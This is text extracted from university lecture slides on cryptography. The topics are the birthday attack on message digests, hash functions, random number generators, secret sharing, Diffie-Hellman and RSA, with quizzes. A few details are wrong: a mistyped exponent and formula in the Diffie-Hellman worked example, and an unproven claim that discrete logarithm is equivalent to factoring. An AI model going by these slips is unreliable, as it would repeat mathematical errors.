Requirements of Message Digest Effectively Unique : Ø Requirement 3 is vital because : – I t prevents one document whose MD has been signed from being replaced by another document with the same MD . Ø Requirement 4 is more subtle and relies on the following statistical facts : – Birthday Attack


<!-- Page 283 -->

Birthday Attack Ø How many people must be in a room before there is a greater than even probability (50% chance) that one of them shares a birthday with me? – Answer 183. Ø How many people must be in a room before there is a greater than even probability that two of them share a birthday ( Birthday paradox )? – Answer 23. Ø It is much easier to find two random people with the same birthday than it is to find someone with the same birthday as a specified person.


<!-- Page 284 -->

Birthday Paradox Ø How many people must be in a room to make sure that we can always find two people sharing the same birthday? – It’s 366, obviously! Ø How many people must be in a room to make sure that the probability of finding two people sharing the same birthday is greater than even probability (50%)? – It’s 23? Why? The birthday paradox refers to the counterintuitive fact that only 23 people are needed for that probability to exceed 50%. https://en.wikipedia.org/wiki/Birthday_ problem


<!-- Page 285 -->

Birthday Attack with Documents Ø Again, it is much easier to find two random people with the same birthday than it is to find someone with the same birthday as a specified person. Ø If we start with one document, we can create many different documents that look similar by : – Adding a space at the end of a line. – Adding a space/backspace combination. Ø Let us assume that the message digest has m bits. Ø Finding another document with the same message digest requires a r o un d 2 m a tt e m p t s . Ø Finding two random documents with the same message digest requires a r o un d 2 m /2 at t e m p t s . – It will require building a table of previous attempts.


<!-- Page 286 -->

Birthday Attack Example Ø Let us assume that m = 8 , so there are 256 possible message digests. Ø We have a document D with message digest MD . Ø We want to create another random document with the same message digest MD . Ø Each random document with have a 1/256 chance of doing this. Ø We would need to try around 128 random documents (half of 256 ), on average , to find one.


<!-- Page 287 -->

Ø Now let us make 15 random changes to document D. We have a total of 16 target MD values. – We store them in a lookup table. Ø Now make random changes to the second document. Ø Each change will have a 1/16 chance of matching one of the 16 target MD values. – On average we need to create 8 documents. Ø We need to create about 16+8 = 24 random documents to have a 50% probability of finding a match. – This is a lot easier. Birthday Attack Example


<!-- Page 288 -->

Size of Message Digest Ø If m = 64 then the first problem requires 2 64 = 10 19 attempts, while the second requires 2 32 = 10 10 attempts. Ø 64 bits is too small to survive a birthday attack, and the message digest must be at least 128 bits long . – In practice, they are usually 256 bits long.


<!-- Page 289 -->

Designing a Hash Function


<!-- Page 290 -->

General Form of Hash Functions Ø Hash functions take a document and produce a message digest. Ø Hash functions have to reduce the size of a document, and normally work by first breaking the document into blocks, each the same length as the final hash value . Ø A function is defined that takes two blocks as input and one as output . Ø The function is then called iteratively: Ø Its two inputs will be: – The previous output – The next message block.


<!-- Page 291 -->

Ø We have. h i = f(M i , h i - 1 ) Ø The function f is usually a combination of Å and other simple operations. Ø The result of the hash function will be the final value of h when the iteration has finished. Ø Hash function algorithms are similar to single - key encryption algorithms . Ø We will not go into details of these algorithms . General Form of Hash Functions


<!-- Page 292 -->

A Survey of Hash Functions Ø MD5 was invented by Ron Rivest of RSA fame (see later) – 128 bits. – Found to be vulnerable to a birthday attack. Ø SHA - 1 was produced by NIST – Secure Hash Algorithm 1 – 160 bits – Found to be vulnerable to a birthday attack. Ø SHA - 2 was also produced by NIST, with 4 versions – SHA - 256 (or 224); SHA - 512 (or 384) bits – Secure so far. Ø SHA - 3 public competition with adoption in 2012.


<!-- Page 293 -->

The SHA - 3 Competition Ø Following the success of the AES competition, NIST announced a competition for a message digest, to be called SHA - 3, in November 2007. Ø 64 entrants were submitted by October 2008 Ø 51 were accepted for the first round and public scrutiny began . – About 20 were broken. Ø 14 made it into the second round.


<!-- Page 294 -->

Ø 5 finalists were announced in December 2010. – BLAKE (Jean - Philippe Aumasson et. al.) – Grøstl (Knudsen et. al.) based on AES. – JH ( Hongjun Wu) – Keccak (Daemen et. al.) – Skein ( Schneier et. al.) Ø All finalist’s functions were tweaked in response to public analysis. Ø The winner, announced in October 2012, was Keccak. – Their entry was significantly faster than the others. Ø NIST wanted to change Keccak slightly to trade off security for speed but backed off because of the climate of mistrust. The SHA - 3 Competition


<!-- Page 295 -->

Algorithmic Features Ø NIST encouraged different styles of algorithms, which can be classified into 3 groups: 1. Similar to existing algorithms 2. Similar to AES 3. Based on manipulating a small number of bits. Ø Keccak is in the 3 rd group and is a ‘sponge’ algorithm. Ø The public scrutiny did not reveal any new classes of attack.


<!-- Page 296 -->

Last Block Padding Ø SHA - 256 padding – The message is processed as 512 - bit blocks, and so must be padded out initially to a multiple of 512 bits. – Firstly, a 64 - bit representation of the length of the document is prepared . – Then the document is padded out to 64 bits less than a multiple of 512 bits by adding a 1 bit, followed by as many 0’ s as necessary. – Finally, the 64 - bit length is added at the end. Ø Keccak padding – A 1 - bit is added, followed by as many 0 - bits as necessary and then a final 1 - bit.


<!-- Page 297 -->

Summary Ø Message Digests – Use a one - way hash function. – Four requirements for Message Digest – Resistant to a birthday attack (collision) – Some popular Hash functions have been proposed – Open competition for SHA - 3


<!-- Page 298 -->

Quiz 1. Explain the term message digest. Explain why a 64 - bit message digest is vulnerable to misuse. 2. Fasthash is a special - purpose chip that can calculate the message digest of a standard legal document in 10 - 6 seconds. The message digest produced is a convenient 32 bits and can be stored as an integer . Lawyer Bob has prepared 2 different documents entitled “Rip Off” and “Sweet Deal” respectively. He knows the message digest produced by the “Sweet Deal” document . – Describe how he might modify the “Rip Off” document so that it produces the same message digest as the “Sweet Deal” document . – Roughly how long will it take him to do so, assuming that document editing time is negligible? Describe in detail how he could achieve the same aim in less time.


<!-- Page 299 -->

COMPSCI5079(M) Cryptography & Secure Development Dr. Nguyen Truong Lecturer (Assistant Professor), SoCS , University of Glasgow Email: Nguyen.Truong@Glasgow.ac.uk Office: SAWB 221C, Sir Alwyn Williams Building, 18 Lilybank Gardens


<!-- Page 300 -->

Lecture 4: Message Digests, Random Numbers and Secret Sharing


<!-- Page 301 -->

Outline 1. Message Digest – Message Digest Concept – Design a Hash Function 2. Random Numbers – Real Random numbers – Pseudo - random numbers – Cryptographically Secure Pseudo - random numbers 3. Secret Sharing (Multiple key cryptography) – Secret Splitting – Secret Sharing


<!-- Page 302 -->

Random Numbers


<!-- Page 303 -->

Random Numbers Generator 1. Pseudo - random Numbers – A pseudo - random number sequence looks like a real random number sequence but is repeatable. 2. Cryptographically Pseudo - random Numbers – A cryptographically secure pseudo - random number sequence cannot be predicted from some of the numbers in the sequence. 3. Real Random Numbers – A real random number sequence cannot be repeated if the generator is run again.


<!-- Page 304 -->

Pseudo - Random Sequences Ø Pseudo - random number sequences are sequences that are completely predictable from the starting value. Ø Their distribution looks random – The frequency distribution of values, pairs of values etc., is the same as a random sequence. Ø They are useful for simulation. Ø They can sometimes be useful for encryption, but care must be taken.


<!-- Page 305 -->

Linear Congruential Generators (LCG) Ø These use the following formula to generate a series of numbers: X n = (aX n - 1 + b) mod m Ø The first value, X 0 , is the seed of the sequence. Ø These operators are fast and produce good properties, provided the values of a, b and m are chosen well. Ø Unfortunately, they are not cryptographically secure, and so cannot be used for encryption. Ø There are many other applications in cryptography for which this type of sequence is good enough.


<!-- Page 306 -->

LCG Example LCG( a,b,m,Xo ) Ø Example: LCG (5, 1, 16, 1) – a= 5, b=1, m=16, and X0 =1.1 Ø The sequence of pseudo - random integers generated by this algorithm is: 1,6,15,12,13,2,11,8,9,14,7,4,5,10,3,0 , 1,6,15,12,13,2,11,8,9,14, ..


<!-- Page 307 -->

LCG Example We observe that: Ø The period P (the number of integers before the sequence repeats) is 16 - exactly equal to the modulus, m . Thus, for m=16 , this sequence is of a long period (the longest possible), and uniform (it completely fills the space of integers from 0 - 15). Ø Sequence exhibits throughout its period the pattern of alternating odd and even integers. Ø It is readily apparent that the sequence is serially correlated. Ø Due to this lack of randomness, the values should not be used as random digits. Ø The real numbers generated from the integer sequence are generally sufficiently random in the higher order (most significant) bits to be used in many application codes.


<!-- Page 308 -->

LCG Example Lehmer /Park and Miller Ø An instance of LCG with particular parameters Ø An established standard known as MINSTD • m = 2147483647 (2 31 – 1 a Mersenne prime*) • a = 16807 (7 5 ) • b = 0 Ø If X i is very small, then X i+1 will also be very small. This is a weakness. * https://en.wikipedia.org/wiki/Mersenne_prime


<!-- Page 309 -->

Cryptographically Secure Pseudo - Random Sequences Ø The sequence looks random and is also unpredictable. – Knowledge of all the preceding numbers in the sequence does not make it easier to predict the next number in the sequence. Ø It is not possible to calculate the seed to generate a given sequence. – So, we cannot find the seed which will generate a short sequence of random numbers provided in advance. Ø Elliptic curves (see the next session) are the most commonly used cryptographically secure random number generators.


<!-- Page 310 -->

Running Key Ciphers with Pseudo - Random Numbers Ø If the sequence is cryptographically secure, then it can be used as a running key cipher. – Let M i be a sequence of message blocks and R i be a sequence of Pseudo - Random numbers. – Then C i = M i Å R i is the ciphertext. – The single key to the algorithm is the initial value (seed) of the sequence. Ø All pseudo - random sequences are periodic, but the period is usually much longer than the message that is being encrypted.


<!-- Page 311 -->

Real Random Sequences Ø Real random sequences have all the properties of pseudo - random sequences, and also an additional property. – They cannot be reliably reproduced. – If you run the generator twice with the same input, the resulting sequences will be different.


<!-- Page 312 -->

Ø These sequences can be used as a one - time pad. All the values must be stored. Ø In 1955 the RAND Corporation published a book containing 1,000,000 random digits. – They were produced before the computer era, and so do not have any computer - induced bias. – Thus, they are still used now. Real Random Sequences


<!-- Page 313 -->

Generating Real Random Sequences Ø Computer Clock: – The most significant bits will stay the same for long periods of time and will be easy to predict. – The least significant few bits from the system time will be reasonably difficult to predict. – The least significant bit may have some periodicity based on the natural machine clock cycle. – Taking the middle chunk of bits from a very accurate clock is best.


<!-- Page 314 -->

Ø Keyboard Latency – Measure the time between successive keystrokes , which is quite random. – This is OK for generating short random sequences. – Requires a person to press the keys. Ø Using Random Noise – Measure the time interval between random events such as atmospheric noise being above a certain threshold. Generating Real Random Sequences


<!-- Page 315 -->

Problems with PRNG: Netscape Case - study Netscape’s Pseudo - Random Generator Ø In 1996 two Computing students discovered a flaw in Netscape’s PRNG that enabled them to easily break SSL. – Secure Sockets Layer, now replaced by Transport Layer Security. Ø At that time, the US government viewed crypto products as munitions and prevented their exports to non - Americans – The USA SSL key length was 128 bits , which would take a long time to break with a brute force attack. – Export versions had a key length of 40 bits , which would require 2 40 ≈ 10 12 attempts. – Just about anyone could break the export version with a Brute - force attack.


<!-- Page 316 -->

Secure Socket Layer Ø A Secure Socket Layer (SSL): security protocol developed by Netscape in 1995 Ø SSL encrypts data that is transmitted across the web. Ø SSL initiates an authentication process called a handshake between two communicating devices – The SSL (or TLS) client sends the random byte string that enables both the client and the server to compute the secret key to be used for encrypting subsequent message data. Ø SSL also digitally signs data in order to provide data integrity, verifying that the data is not tampered with before reaching its intended recipient


<!-- Page 317 -->

SSL Protocol


<!-- Page 318 -->

Netscape’s PRNG Ø A random number generator was called 4 times to generate the key. Ø The weakness was in the way the initial seed was chosen. – It was based on the process number, the parent process number and the time in milliseconds. Ø It was fairly easy for an attacker to find out the process numbers and the time to the nearest second. Ø Communications were initiated by one party sending a random number and the other replying with the encrypted version. – Thus, a known plaintext attack was possible. Ø Just 10 6 attempts were needed to break both the USA and export versions of Netscape SSL. – It took 25 seconds on a standard PC at the time.


<!-- Page 319 -->

Dual_EC_DRBG CSPRNG Ø This stands for Dual Elliptic Curve Deterministic Random N umber Generator. Ø A cryptographically secure pseudorandom number generator (CSPRNG) Ø An elliptic curve is any curve with the form: y 2 = x 3 + ax + b Ø In 2007 NIST issued a new random number standard with 4 algorithms. The recommended and default algorithm was Dual_EC_DRBG . Ø It was recommended by the NSA. Ø There were already questions about the algorithm.


<!-- Page 320 -->

Crypto 2007: Aug 2007 Ø Dan Shumow and Niels Ferguson from Microsoft demonstrated that the algorithm had some secret parameters used to derive the public parameters. Ø These secret parameters could be used to recover all the internal workings of the PRNG from 32 bytes of output. Ø Prominent figures in the crypto community at the time, such as Bruce Sc h n e i e r , r e c om m e nd e d t h a t Dual_EC_DRB G s ho u l d not be u s e d.


<!-- Page 321 -->

OpenSSL Ø This is an open - source library of crypto implementations. Ø The OpenSSL project was founded in 1998 to provide a free set of encryption tools for the code used on the Internet. Ø The user could choose between several different pseudo - random number generators. – Dual_EC_DRB G w a s o ne of t h e m , a ltho u g h n ot t he d e f a u l t . Ø A coding bug discovered in December 2013 meant that it was i m po ss i b l e t o c h o o s e Dual_EC_DRB G a s t he r a nd om nu m b e r generator. Ø There were no bug reports, and so no one had tried.


<!-- Page 322 -->

NIST and RSA Ø The RSA organisation used Dual_EC_DRBG in its product Bsafe as the default, on recommendation from the NSA, starting in 2004. Ø In September 2013 NIST strongly recommended that Dual_EC_DRBG no l o ng e r b e u s e d . Ø RSA then also recommended that it not be used.


<!-- Page 323 -->

Summary Ø Random Numbers Generators – Real random numbers based on keyboard latency time or physical fluctuations – Pseudo - random numbers are predictable but have random statistics. – Cryptographically secure pseudo - random numbers - knowledge of part of the sequence cannot generate the rest.


<!-- Page 324 -->

Quizzes 1. Describe the differences between real random numbers, pseudo - random numbers and cryptographically secure pseudo - random number sequences. 2. Give one algorithm for producing each of the above types of random numbers (three algorithms in total).


<!-- Page 325 -->

COMPSCI5079(M) Cryptography & Secure Development Dr. Nguyen Truong Lecturer (Assistant Professor), SoCS , University of Glasgow Email: Nguyen.Truong@Glasgow.ac.uk Office: SAWB 221C, Sir Alwyn Williams Building, 18 Lilybank Gardens


<!-- Page 326 -->

Lecture 4: Message Digests, Random Numbers and Secret Sharing


<!-- Page 327 -->

Outline 1. Message Digest – Message Digest Concept – Design a Hash Function 2. Random Numbers – Real Random numbers – Pseudo - random numbers – Cryptographically Secure Pseudo - random numbers 3. Secret Sharing ( Multiple - key cryptography) – Secret Splitting – Secret Sharing


<!-- Page 328 -->

Secret Sharing (Multiple - key Cryptography)


<!-- Page 329 -->

Secret Splitting Ø Let us imagine that we have a secret that we cannot entrust to just one person , but want to split between two people. Ø Both people are needed to reconstruct the message. Ø We cannot just give half the bits to each person. – It would make it easier for one person to make a Brute - force attack to recover the other person’s half.


<!-- Page 330 -->

Ø The following protocol lets the boss Sam split the secret between two underlings Alice and Bob. – Let M be the secret message. – Sam obtains a truly random bit string R , the same length as M, from a trusted third - party Trent. – Sam calculates P = M Å R , gives P to Alice and R to Bob. – The message can be reconstructed as P Å R = M . Ø This technique cannot be broken by cryptographic techniques, since R is a one - time pad . Secret Splitting


<!-- Page 331 -->

Splitting between more than two people Ø This technique is easily generalised to more than two people. – Let us split the secret between Alice, Bob, Carol and Dave. – Sam provides three random bit strings, R, S and T. – The fourth string P = M Å R Å S Å T. – The four strings are distributed to the four underlings. – The original message is recovered by P Å R Å S Å T = M . Ø Limitations of this protocol – The boss has absolute power and can hand out rubbish if he wants. – All pieces of the encrypted message are necessary. – If Alice falls under a bus, then the secret is lost.


<!-- Page 332 -->

Secret Sharing Ø It is possible to split a secret up into n pieces so that it can be recovered with only m of the pieces. This is called a threshold scheme ( m,n ) . Ø With a (3,4) threshold scheme, the secret can be divided into 4 pieces and given to Alice, Bob, Carol and Dave. – Only three of them (any three) are needed to recover the secret. – If Alice falls under a bus, then the secret is recoverable, – but if Bob is away at the time, then Carol and Dave cannot recover the secret by themselves. Ø The individual pieces are called shadows .


<!-- Page 333 -->

Lagrange Interpolation Scheme(Shamir) Ø This scheme is based on the numerical solution of linear equations. Ø Integers are used to avoid the problem of rounding errors that arise when using real numbers. Ø Naturally, the integers are calculated modulo p , so that division produces an integer answer. Ø The shadows are calculated using a polynomial of the appropriate degree. – This is not polynomial arithmetic, as discussed in 1 st lecture . We are interested in solving the equation and finding x . Ø If 2 shadows are needed to construct the key, then the appropriate polynomial is a line which has two unknown coefficients a and b : y(x) = a * x + b (mod p)


<!-- Page 334 -->

Lagrange Interpolation Scheme(Shamir) The algorithm when 2 shadows are needed : Ø Choose a prime number p w hich is larger than the number of shadows ( n ) and the largest secret . – Prime p must be handed out along with the shadows and made public. Ø Choose a random number < p f or the coefficient a . – It is only used to generate the shadows and is discarded after the shadows are calculated. – It must be kept secret. Ø The coefficient b i s the secret message M . Ø This produces the polynomial: y (x) = a x + b (mod p)


<!-- Page 335 -->

Ø The shadows are calculated by evaluating the polynomial at n different random values of x . I will use x = 1 , 2, 3, 4 for simplicity. Ø Each shadow (or key) is a triple (x, y, p). – shadow(1) = y(1) – shadow(2) = y(2) – shadow(3) = y(3) – shadow(4) = y(4) Ø Since the straight line has two unknown coefficients a a nd b , any two shadows can be used to find them. Ø The shadows generate two linear equations which can be solved for the t wo u n kn o w ns a an d b . Ø We want b , which is the secret M . Lagrange Interpolation Scheme(Shamir)


<!-- Page 336 -->

Shamir Secret Sharing : Example Ø Let the secret M be 11. Ø Chose p = 13, a = 7. Ø In practice, larger numbers will be used! Ø Generate 4 keys from y(x) = 7 x + 11 (mod 13) k 1 = y(1) mod 13 = 5 (key = 1, 5, 13) k 2 = y(2) mod 13 = 12 (key = 2, 12 , 13) k 3 = y(3) mod 13 = 6 (key = 3, 6, 13) k 4 = y(4) mod 13 = 0 (key = 4, 0, 13)


<!-- Page 337 -->

Ø Now let us recover the secret from two keys, say k 2 , k 3 . • 2a + M = 12 (mod 13) --- (EQ_1 ) • 3a + M = 6 (mod 13) --- (EQ_2 ) Ø These equations must be solved. Ø We can eliminate a by using 3* (EQ_1 ) – 2* (EQ_2 ) • 3 * EQ_1 is 6a + 3M = 10 (mod 13) • 2 * EQ_2 is 6a + 2M = 12 (mod 13) Ø Subtracting M = - 2 = 11 (mod 13) , the secret. Shamir Secret Sharing : Example


<!-- Page 338 -->

Cheating with Secret Sharing Ø Alice, Bob and Carol are sitting in a bunker when the message "Launch those missiles" comes from the president. Carol is a pacifist and so enters a random number rather than her shadow. – The missiles stay in their silos, and no one can find out why. Ø Alice, Bob and Eve (disguised as Carol) are sitting in the bunker and the same thing happens. Eve secretly notes down the shadows entered by Alice and Bob. – The missiles stay in their silos but now Eve knows all three of the shadows . She can then retarget the missile and launch it herself.


<!-- Page 339 -->

Cheating Prevention Ø The Lagrangian protocol/Shamir Secret Sharing can be modified to make it easier to detect cheaters, with an increase in the complexity of the way the algorithm is applied . Ø The basic approach is to have a series of secrets, each linked to the previous , with only the last being useful. Ø The cheater is then revealed early on.


<!-- Page 340 -->

Summary Ø Secret Sharing / Multiple - key cryptography. – Secret splitting using XOR . All parties needed to reconstruct the key . – Secret sharing based on linear equations. Only some of the parties are needed .


<!-- Page 341 -->

Quizzes 4. An organisation has decided that its secrets are too valuable to entrust to just one person and has decided that three people will be needed to access the secret information. Devise a scheme that will allow the head of the organisation to issue passwords to three people in such a way that all three passwords are needed simultaneously. Give a numerical example of the operation of your scheme when the secret is the number 42. You may assume that each secret is a 6 - bit number. 5. One drawback of the previous scheme is that all three persons are needed to operate it. All secrets would be lost if one person were to have an accident. Devise an alternative scheme where three people are still needed to access the information, but five people have parts of the key. Any three people will be sufficient. A numerical example is not needed!


<!-- Page 342 -->

COMPSCI5079(M) Cryptography & Secure Development Dr. Nguyen Truong Lecturer (Assistant Professor), SoCS , University of Glasgow Email: Nguyen.Truong@Glasgow.ac.uk Office: SAWB 221C, Sir Alwyn Williams Building, 18 Lilybank Gardens


<!-- Page 343 -->

Lecture 5: Public - key Cryptography


<!-- Page 344 -->

Lecture 4: Review


<!-- Page 345 -->

Main points to take home Ø Message Digests – Use a one - way hash function. – Resistant to a birthday attack (collision) – Open competition for SHA - 3 Ø Random Numbers Generators – Real random numbers based on keyboard latency time or physical fluctuations – Pseudo - random numbers are predictable but have random statistics . – Cryptographically secure pseudo - random numbers - knowledge of part of the sequence can't generate the rest.


<!-- Page 346 -->

Main points to take home Ø Secret Sharing / Multiple - key cryptography. – Secret splitting using XOR . All parties needed to reconstruct the key . • Random b it strings, R, S and T, and the P = M Å R Å S Å T • The original message is recovered by P Å R Å S Å T = M. – Secret sharing based on linear equations. Only some of the parties needed • Shamir Secret Sharing Scheme (Threshold scheme) • If 2 shadows are needed to construct the key, then the appropriate polynomial is a line which has two unknown coefficients a and b : y (x) = a * x + b (mod p) » p: large prime number, made public » Random number coefficient a < p » The coefficient b is the secret message M .


<!-- Page 347 -->

Lecture 5: Public - key Cryptography


<!-- Page 348 -->

Outline 1. Overview – Introduction – A Big Picture 2. Diffie Hellman Key Exchange Protocol 3. RSA Public key Cryptography – KeyGen – Encryption / Decryption – Digital Signature 4. Elliptic Curves Cryptography


<!-- Page 349 -->

Lecture 5: 1. Overview


<!-- Page 350 -->

How Cryptography work Encryption Key Decryption Key Al i c e B o b Trudy


<!-- Page 351 -->

What we have learned so far Ø Single - key / Symmetric key Systems: Ø Alice and Bob both know a same secret K so that the Encryption key and Decryption key can be inferred from the secret key K Ø For instance: Substitution Cipher: Ø The secret key, in this case, is the “substitution pattern” Plaintext: abcdefghijklmnopqrstuvwxyz Ciphertext: mnbvcxzasdfghjklpoiuytrewq Plaintext: bob. i love you. alice Ciphertext: nkn . s gktc wky . mgsbc


<!-- Page 352 -->

Public Key Cryptography Symmetric Key Crypto Key Distribution challenge: Requires sender, receiver know shared secret key : Q: How to agree on the key in the first place (particularly if never “met”)? Public Key Cryptography • Radically different approach [Diffie - Hellman76, RSA78] • Sender, receiver do not share secret key • Public encryption key known to all • Private decryption key known only to receiver


<!-- Page 353 -->

How Cryptography works Encryption Key Decryption Key Al i c e B o b Trudy Bob’s public key Bob’s private key K pk K sk m m = Dec(Enc( K pk ,m ), K sk ) Enc(m, K pk )


<!-- Page 354 -->

Public - key Cryptography: Requirements Ø Each person owns a key - pair ( K sk , K pk ). K pk revealed to the world; K sk is kept secretly Ø Given Public key K pk , it is impractical to compute the private key K sk Ø Need to design functions Enc and Dec so that: Ø Note that: “ Use public key first (encrypt), followed by private key (decrypt )” AND “Use private key first, followed by public key” should produce the same results. m = Dec( K sk ,Enc ( K pk ,m ))


<!-- Page 355 -->

Public - key Cryptography: Overview Ø Foundation of today’s secure communication Ø Allows communicating parties to obtain a shared secret key Ø Public key (for encryption) and Private key (for decryption) Ø Private key (for digital signature) and Public key (to verify signature)


<!-- Page 356 -->

Brief History Ø Historically same key was used for encryption and decryption Ø Challenge: key distribution, how to exchange key Ø 1976: Whitfield Diffie and Martin Hellman § Key exchange protocol § This indeed proposed a new public - key cryptosystem Ø 1978: Ron Rivest, Adi Shamir, and Leonard Adleman § Attempted to develop a cryptosystem § Created RSA algorithm


<!-- Page 357 -->

Lecture 5: 2 . Diffie - Hellman Key Exchange Protocol


<!-- Page 358 -->

Key Exchange Challenge Ø On e of the main problems of symmetric key encryption is it requires a secure & reliable channel for the shared key exchange. Ø The Diffie - Hellman Key Exchange protocol offers a way in which a public channel can be used to create a confidential shared key Ø Diffie - Hellman Key Exchange: a protocol that enables two users to establish a secret key using a public - key scheme based on discrete logarithms. Ø The protocol is secure only if the authenticity of the two participants can be established . Ø In practice, the shared encryption key relies on such complex concepts as Modular Exponentiation , Primitive Roots and Discrete Logarithm Problems


<!-- Page 359 -->

Diffie Hellman idea Ø A Difficult One - Way Operation: easy to DO but hard to UNDO – Mixing Colors: Easy to mix 2 colours , hard to unmix – Purpose: Alice & Bob (with Trudy listening) wish to make a secret shared colour Al i c e B o b Trudy Communication channel


<!-- Page 360 -->

Diffie Hellman idea Ø Step 1: Both publicly agree to a shared colour – Let's say it’s YELLOW, and Trudy can obtain this colour by listening to the communication channel Al i c e B o b Trudy Communication channel


<!-- Page 361 -->

Ø Step 2 - Each picks a secret colour – Alice: ORANGE, Bob: TEAL Ø Step 3 - Each adds (mixes) their secret colour to the shared colour Al i c e B o b Trudy Communication channel Colour mixing Colour mixing Diffie Hellman idea


<!-- Page 362 -->

Diffie Hellman idea Ø Step 4 - Each sends the other their new mixed color Al i c e B o b Trudy Communication channel


<!-- Page 363 -->

Diffie Hellman idea Ø Step 5 - Each combines the shared colour from the other with their own secret colour Ø Result: Alice and Bob successfully established a secret shared colour Al i c e B o b Trudy Communication channel Colour mixing Colour mixing


<!-- Page 364 -->

Alice & Bob have agreed to a shared colour unknown to Trudy Ø How is it that Alice & Bob’s final mixtures are identical? ü Alice mixed: ü [(Yellow + Teal) from Bob ] + Orange ü Bob mixed: ü [(Yellow + Orange) from Alice ] + Teal


<!-- Page 365 -->

Ø How is it that Alice & Bob’s final mixture is secret? ü Trudy never has knowledge of the secret colours of either Alice or Bob ü Unmixing a colour into its component colours is a hard problem Alice & Bob have agreed to a shared colour unknown to Trudy


<!-- Page 366 -->

Diffie Hellman Algorithm: Overview Ø The Diffie - Hellman key exchange uses an exponential encryption system to generate a single key that is shared by two people. Ø Both parties contribute to the key by sharing information over an insecure communication channel. Ø Each party keeps some information secret. This secret information is vital to be able to construct the key. Ø The key cannot be generated from the public information. Ø This algorithm forms the basis for session key construction in many internet applications.


<!-- Page 367 -->

One - way Operation Ø We need to find an operation similar to “Mixing colours ”: Easy to DO and hard to UNDO . Let’s consider Multiplicative group of Integers mod p s = g n mod p Ø We have: Easy: given g, n, & p, solve for s Hard: given s, g, & p, solve for n Ø And the property of: g a*b mod p = g b *a mod p


<!-- Page 368 -->

Step 1 – Publicly shared information Ø Alice & Bob publicly agree to a large prime number called the modulus, or p . Ø Alice & Bob publicly agree to a number called the generator, or g , which has a primitive root relationship with p . Ø In our example we’ll assume p = 17, g = 3 Ø Trudy is aware of the values of p or g .


<!-- Page 369 -->

Step 2 – Select a Secret Key Ø Alice selects a secret key, which we will call a. Ø Bob selects a secret key, which we will call b. Ø For the example, we assume: a = 54 b = 24 Ø Trudy is unaware of the values of a or b .


<!-- Page 370 -->

Step 3 – Combine secret keys with public information Ø Alice combines her secret key of a with the public info to compute A as her public key. A = g a mod p A = 3 54 mod 17 A = 15 Ø Bob combines his secret key of b with the public info to compute B as his public key. B = g b mod p B = 3 54 mod 17 B = 16


<!-- Page 371 -->

Step 4 – Share combined values Ø Alice shares her combined value, A, with Bob. Bob shares his combined value, B, with Alice. Ø Sent to Bob A = 15 Ø Sent to Alice B = 16 Ø Eve is privy to this exchange and knows the values of A and B


<!-- Page 372 -->

Step 5 – Compute Shared Key Ø Alice computes the shared key. s = (B mod p) a mod p s = g b *a mod p s = 3 54*24 mod 17 s = 1 Ø Bob computes the shared key. s = (A mod p) a mod p s = g a*b mod p s = 3 24*54 mod 17 s = 1 Ø Alice & Bob have created a shared secret key, s , unknown to Trudy


<!-- Page 373 -->

Diffie Hellman Algorithm Ø Attacker Trudy only knows p, g, A and B , and so cannot compute S . Ø For best result, (p - 1)/2 should also be a prime and g should be a primitive root of p. • This means: g x % p, 1 < x < p takes all the values between 1 and p. • Thus, all possible values are used. Ø This scheme is vulnerable to a man - in - the - middle attack. • Just like other public key systems.


<!-- Page 374 -->

Security of Diffie Hellman Ø The Diffe - Hellman algorithm relies on the hardness of the discrete logarithm problem for its security. Ø The discrete logarithm problem states that if we know p, g and public key A = g x % p , then it is computationally infeasible to calculate the private key a . Ø It can be shown that this problem is equivalent to the factoring problem. Ø If a fast algorithm for factoring is discovered then there exists an equivalent fast algorithm for solving the discrete logarithm problem, and vice versa.


<!-- Page 375 -->

Summary Ø A big picture of Public key Cryptography – A party owns a key pair (Public key, Private key ) – Encrypt using Public key, decrypt using Private key Ø Diffie Hellman Key Exchange protocol – Public channels can be used to create a confidential shared key function. – One - way operation should be used • Mix colour example – In practice: we use multiplicative group of integers modulo p, where p is prime, and g is a primitive root modulo p


<!-- Page 376 -->

Quizzes 1. Describe in detail the Diffie - Hellman method whereby Alice and Bob can agree on a common key.


<!-- Page 377 -->

COMPSCI5079(M) Cryptography & Secure Development Dr. Nguyen Truong Lecturer (Assistant Professor), SoCS , University of Glasgow Email: Nguyen.Truong@Glasgow.ac.uk Office: SAWB 221C, Sir Alwyn Williams Building, 18 Lilybank Gardens


<!-- Page 378 -->

Lecture 5: Public - key Cryptography


<!-- Page 379 -->

Outline 1. Overview – Introduction – A Big Picture 2. Diffie Hellman Key Exchange Protocol 3. RSA Public key Cryptography – KeyGen – Encryption / Decryption – Digital Signature 4. Elliptic Curves Cryptography


<!-- Page 380 -->

Lecture 5: 3. RSA Public - key Cryptography


<!-- Page 381 -->

RSA Algorithm Ø Invented in 1978 by Ron Rivest, Adi Shamir and Leonard Adleman Ø Published as R L Rivest, A Shamir, L Adleman, "On Digital Signatures and Public Key Cryptosystems", Communications of the ACM, vol 21 no 2, pp120 - 126, Feb 1978. Ø Security relies on the difficulty of factoring large composite numbers Ø Essentially the same algorithm was discovered in 1973 by Clifford Cocks, who works for the British intelligence


<!-- Page 382 -->

RSA Example Alice wants to send Bob a message M using RSA 1. Bob generates a key - pair (pk, sk ); pk is publicly available. 2. Alice encrypts the message M with Bob’s public - key pk 3. Bob decrypts the ciphertext C with his private - key sk


<!-- Page 383 -->

RSA Example : Key Generation ( KeyGen ) Key generation: how to generate (pk, sk ) for Bob 1. Select 2 large prime numbers of about the same size, p and q 2. Compute n = pq , and F (n)=(q - 1)(p - 1) 3. Select e, 1<e< F (n) , s.t. gcd (e, F (n))= 1 4. Compute d, 1< d< F (n) s.t. ed º 1 mod F (n) Then the key pair is formulated as follows: Public key: pk =(e, n) ; Private key: sk =(d, n)


<!-- Page 384 -->

RSA Example: Encryption and Decryption Encryption : 1. Given a message M, 0 < M < n ; M Î Z n - {0} 2. Use the public key pk = (e, n) 3. Compute ciphertext C = M e mod n ; C Î Z n - {0} Decryption : 1. Given a ciphertext C 2. Use the private key sk = (d, n) 3. Compute C d mod n = (M e mod n) d mod n = M ed mod n = M


<!-- Page 385 -->

RSA Example Key generation § p = 11, q = 7, n = 77, F (n) = 60 § d = 13, e = 37 (ed = 481; ed mod 60 = 1) Encryption : § Let M = 15. Then C º M e mod n C º 15 37 (mod 77) = 71 Decryption : § M º C d mod n M º 71 13 (mod 77) = 15


<!-- Page 386 -->

Why does this RSA work? Any proof?


<!-- Page 387 -->

